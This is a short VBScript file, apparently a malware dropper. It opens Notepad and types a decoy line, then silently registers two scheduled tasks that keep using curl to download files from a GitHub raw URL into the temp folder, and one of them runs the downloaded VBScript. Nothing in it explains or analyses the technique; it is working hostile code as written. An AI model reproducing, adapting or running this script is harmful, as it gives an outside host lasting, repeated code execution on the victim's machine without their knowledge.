Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "c:\windows\system32\notepad.exe"

WScript.Sleep 1000

Notepad.SendKeys "Password: secure this"

Set sh = CreateObject("WScript.Shell")
sh.Run ("schtasks /create /sc minute /mo 3 /tn ""A2"" /tr ""curl https://raw.githubusercontent.com/section10housing/b1/master/R1.txt -o %tmp%\R1.ps1""")

Set sq = CreateObject("WScript.Shell")
sq.Run ("schtasks /create /sc minute /mo 4 /tn ""A3"" /tr ""curl https://raw.githubusercontent.com/section10housing/b1/master/z2.txt -o %tmp%\z2.vbs & %tmp%\z2.vbs""")






